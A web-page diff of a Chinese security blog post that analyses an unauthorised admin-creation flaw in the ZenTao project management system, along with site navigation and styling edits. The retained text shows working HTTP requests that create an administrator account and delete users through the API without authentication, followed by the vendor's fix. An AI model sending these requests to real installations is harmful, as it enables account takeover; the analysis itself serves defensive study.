@@ -117,28 +117,6 @@
     
   </li>
   
-  <li class="hide-on-med-and-down nav-item">
-    
-    <a href="/about" class="waves-effect waves-light">
-      
-      <i class="fas fa-user-circle" style="zoom: 0.6;"></i>
-      
-      <span>关于</span>
-    </a>
-    
-  </li>
-  
-  <li class="hide-on-med-and-down nav-item">
-    
-    <a href="/friends" class="waves-effect waves-light">
-      
-      <i class="fas fa-address-book" style="zoom: 0.6;"></i>
-      
-      <span>友情链接</span>
-    </a>
-    
-  </li>
-  
   <li>
     <a href="#searchModal" class="modal-trigger waves-effect waves-light">
       <i id="searchIcon" class="fas fa-search" title="搜索" style="zoom: 0.85;"></i>
@@ -161,7 +139,7 @@
         <div class="logo-name">1uci4n&#39;s blog</div>
         <div class="logo-desc">
             
-            一个专注安全研究的小屋，主要分享Java安全的学习、PHP漏洞析和Java漏洞分析
+            主要分享Java安全的学习、PHP漏洞析和Java漏洞分析
             
         </div>
     </div>
@@ -208,28 +186,6 @@
 			    <i class="fa-fw fas fa-archive"></i>
 			
 			归档
-		</a>
-          
-        </li>
-        
-        <li class="m-nav-item">
-	  
-		<a href="/about" class="waves-effect waves-light">
-			
-			    <i class="fa-fw fas fa-user-circle"></i>
-			
-			关于
-		</a>
-          
-        </li>
-        
-        <li class="m-nav-item">
-	  
-		<a href="/friends" class="waves-effect waves-light">
-			
-			    <i class="fa-fw fas fa-address-book"></i>
-			
-			友情链接
 		</a>
           
         </li>
@@ -358,7 +314,7 @@
 <h3 id="原因一"><a href="#原因一" class="headerlink" title="原因一"></a>原因一</h3><p>系统在module/common/model.php中common类（继承commonModel类）的deny方法对未登录用户做了个处理：</p>
 <pre class="language-php" data-language="php"><code class="language-php"><span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token property">session</span><span class="token operator">-&gt;</span><span class="token function">set</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'user'</span><span class="token punctuation">,</span> <span class="token variable">$user</span><span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre>
 
-<p><img src="/assets/attach-593776b1b1788a1712c0aecf726a4fb5c3643f28.png" alt="image.png"></p>
+<p><img src="/assets/attach-593776b1b1788a1712c0aecf726a4fb5c3643f28.png"></p>
 <p>其中传参$reload不能是false，而<code>$user</code>由<code>$this-&gt;app-&gt;user</code>赋值而来，<code>$this-&gt;app</code>是api类的实例，关键代码在www/api.php中，如下：</p>
 <pre class="language-php" data-language="php"><code class="language-php"><span class="token comment">/* Instance the app. */</span>  
 <span class="token variable">$app</span> <span class="token operator">=</span> <span class="token class-name static-context">router</span><span class="token operator">::</span><span class="token function">createApp</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'pms'</span><span class="token punctuation">,</span> <span class="token function">dirname</span><span class="token punctuation">(</span><span class="token function">dirname</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'api'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  
@@ -367,14 +323,14 @@
 <span class="token variable">$common</span> <span class="token operator">=</span> <span class="token variable">$app</span><span class="token operator">-&gt;</span><span class="token function">loadCommon</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre>
 
 <p>跟进<code>$app-&gt;loadCommon();</code>来到module/common/model.php中commonModel类的setUser方法，该方法会判断<code>$_SESSION['user']</code>是否为空，若不为空则读取<code>$_SESSION['user']</code>并赋值给<code>$this-&gt;app-&gt;user</code>，若为空则进一步判断是否为guest用户，不为guest用户则跳过。</p>
-<p><img src="/assets/attach-d1c57a84243351e67beba44949118d91b641c3a6.png" alt="image.png"></p>
+<p><img src="/assets/attach-d1c57a84243351e67beba44949118d91b641c3a6.png"></p>
 <p>当未登录的用户访问时，<code>$this-&gt;app-&gt;user</code>为空，经过一系列调用后，session会话创建了一个空用户<code>$_SESSION['user']</code></p>
-<p><img src="/assets/attach-0253e41ae69f6f7c9c0d4e77057b0b6b076e3c36.png" alt="image.png"></p>
+<p><img src="/assets/attach-0253e41ae69f6f7c9c0d4e77057b0b6b076e3c36.png"></p>
 <p>值得注意的是config/config.php配置文件中修改Session的会话ID（默认为PHPSESSID）为zentaosid，所以在构造payload的时候应该是Cookie: zentaosid=xxxxxx这种形式。</p>
 <h3 id="原因二"><a href="#原因二" class="headerlink" title="原因二"></a>原因二</h3><p>系统在framework/api/entry.class.php中entry类的checkPriv方法对未授权用户做了一个处理：</p>
 <pre class="language-php" data-language="php"><code class="language-php"><span class="token keyword">return</span> <span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token function">send</span><span class="token punctuation">(</span><span class="token number">403</span><span class="token punctuation">,</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'error'</span> <span class="token operator">=&gt;</span> <span class="token string single-quoted-string">'Access not allowed'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre>
 
-<p><img src="/assets/attach-21dcff093ec04f8566fa3b2c3c94649485afd784.png" alt="image.png"></p>
+<p><img src="/assets/attach-21dcff093ec04f8566fa3b2c3c94649485afd784.png"></p>
 <ul>
 <li><code>$this-&gt;loadModel('common')-&gt;isOpenMethod($module, $method)</code>判断控制器的对象(<code>$module</code>)和方法(<code>$method</code>)是否是开放的（可不经授权调用），如果是开放的则返回true，否则返回false</li>
 <li><code>commonModel::hasPriv($module, $method)</code>判断用户是否拥有权限访问<code>$module</code>的<code>$method</code>方法，若有权限则返回true，无权限则返回false</li>
@@ -395,10 +351,10 @@
 <span class="token punctuation">}</span></code></pre>
 
 <p>跟进<code>$this-&gt;send(403, array('error' =&gt; 'Access not allowed'));</code></p>
-<p><img src="/assets/attach-57d0f99d93d33042064f03ac83a69aa1495296bc.png" alt="image.png"></p>
+<p><img src="/assets/attach-57d0f99d93d33042064f03ac83a69aa1495296bc.png"></p>
 <p>该方法只是规定了响应的数据包，而return不是在控制器里使用的，这并不影响程序继续执行</p>
 <h2 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><h3 id="创建空用户"><a href="#创建空用户" class="headerlink" title="创建空用户"></a>创建空用户</h3><p>系统是通过链式操作调用的deny方法，全局搜索<code>$this-&gt;loadModel('common')-&gt;deny(</code></p>
-<p><img src="/assets/attach-61d3783bda5f98672f8e771355513e0a7dd8e4b3.png" alt="image.png"></p>
+<p><img src="/assets/attach-61d3783bda5f98672f8e771355513e0a7dd8e4b3.png"></p>
 <p>传入deny方法第三个参数不能为false，满足条件的只有module/testcase/control.php中testcase类的三个方法（showXmindImport、saveXmindImpor和getXmindImport），这个类在实例化时调用了<code>helper::isAjaxRequest()</code>，代码如下：</p>
 <pre class="language-php" data-language="php"><code class="language-php"><span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">function</span> <span class="token function-definition function">isAjaxRequest</span><span class="token punctuation">(</span><span class="token operator">?</span><span class="token keyword type-hint">string</span> <span class="token variable">$type</span> <span class="token operator">=</span> <span class="token constant">null</span><span class="token punctuation">)</span><span class="token punctuation">:</span> <span class="token keyword return-type">bool</span>
 <span class="token punctuation">{</span>
@@ -422,13 +378,13 @@ Connection: close
 
 </code></pre>
 
-<p><img src="/assets/attach-19f66d0d8d3015f3930fb29b96544cbf7823327a.png" alt="image.png"></p>
+<p><img src="/assets/attach-19f66d0d8d3015f3930fb29b96544cbf7823327a.png"></p>
 <h3 id="调用API"><a href="#调用API" class="headerlink" title="调用API"></a>调用API</h3><p>entry类的checkPriv方法是通过自己的loadController方法调用的，如下：</p>
-<p><img src="/assets/attach-df0d3f3b5380499e1645c1dd52b8f2cdd33b2ba9.png" alt="image.png"></p>
+<p><img src="/assets/attach-df0d3f3b5380499e1645c1dd52b8f2cdd33b2ba9.png"></p>
 <p>这个方法是API接口用来加载禅道控制器的，全局搜索<code>-&gt;loadController(</code>查看可调用的接口有哪些</p>
-<p><img src="/assets/attach-edebfbd4cc3da75c3a7d6221ce8aa6a9a7027522.png" alt="image.png"></p>
+<p><img src="/assets/attach-edebfbd4cc3da75c3a7d6221ce8aa6a9a7027522.png"></p>
 <p>api/v1/entries/users.php中usersEntry类的post方法调用了该方法来加载user模型，接着又调用了创建用户的方法<code>$control-&gt;create();</code></p>
-<p><img src="/assets/attach-8d12849ae14aa2f4606b819abc41c85fde72292e.png" alt="image.png"></p>
+<p><img src="/assets/attach-8d12849ae14aa2f4606b819abc41c85fde72292e.png"></p>
 <p>至此，我们可以根据代码构造数据包，未授权创建一个管理员用户</p>
 <pre class="language-none"><code class="language-none">POST /api.php/v1/users HTTP/1.1
 Host: 127.0.0.1
@@ -440,9 +396,9 @@ Content-Length: 80
 
 {"account":"qyg","password":"Qyg123456","realname":"qyg","role":"","group":"1"}</code></pre>
 
-<p><img src="/assets/attach-e703abc0c93dda1b2eb6679595547ed8bb80c69d.png" alt="image.png"></p>
+<p><img src="/assets/attach-e703abc0c93dda1b2eb6679595547ed8bb80c69d.png"></p>
 <p>登录后台查看</p>
-<p><img src="/assets/attach-5563ea43bbc42d58ae95757293bc7431d6d791b3.png" alt="image.png"></p>
+<p><img src="/assets/attach-5563ea43bbc42d58ae95757293bc7431d6d791b3.png"></p>
 <p>当然，还可以未授权删除用户，这里删除刚刚创建的用户，id是37</p>
 <pre class="language-none"><code class="language-none">DELETE /api.php/v1/users/37 HTTP/1.1
 Host: 127.0.0.1
@@ -453,14 +409,14 @@ Connection: close
 
 </code></pre>
 
-<p><img src="/assets/attach-a267ad7be2e3fc26461f7ac92bf0c9298098ad83.png" alt="image.png"></p>
+<p><img src="/assets/attach-a267ad7be2e3fc26461f7ac92bf0c9298098ad83.png"></p>
 <p>可以看到，用户已经被删除了</p>
-<p><img src="/assets/attach-d6b3d76b7aa3bda9c726fffa291f146c0ae8f80e.png" alt="image.png"></p>
+<p><img src="/assets/attach-d6b3d76b7aa3bda9c726fffa291f146c0ae8f80e.png"></p>
 <h2 id="漏洞修补"><a href="#漏洞修补" class="headerlink" title="漏洞修补"></a>漏洞修补</h2><p>在禅道项目管理系统开源版18.12中对漏洞进行了修复。<br>先来看看空用户创建这个漏洞，来到module/common/model.php，如下：</p>
-<p><img src="/assets/attach-f79bcd804060e8174ef1c82b861ca04e445bed5d.png" alt="image.png"></p>
+<p><img src="/assets/attach-f79bcd804060e8174ef1c82b861ca04e445bed5d.png"></p>
 <p>在if语句里加了<code>$this-&gt;loadModel('user')-&gt;isLogon()</code>来判断用户是否登录，若用户未登录，则返回false。</p>
 <p>再看一下越权漏洞，来到framework/api/entry.class.php，如下：</p>
-<p><img src="/assets/attach-8699c89fee652b16e4c999866f5b688fcbd82b33.png" alt="image.png"></p>
+<p><img src="/assets/attach-8699c89fee652b16e4c999866f5b688fcbd82b33.png"></p>
 <p>当判断为未授权用户的时候，用<code>die()</code>函数终止了程序的运行。</p>
 <h2 id="个人总结"><a href="#个人总结" class="headerlink" title="个人总结"></a>个人总结</h2><ul>
 <li>return在接口用中来终止程序执行，使用不当可能会产生越权漏洞</li>
@@ -862,6 +818,10 @@ Connection: close
     </a>
 
 
+
+    <a href="mailto:luci4n@qq.com" class="tooltipped" target="_blank" data-tooltip="邮件联系我" data-position="top" data-delay="50">
+        <i class="fas fa-envelope-open"></i>
+    </a>
 
 
 
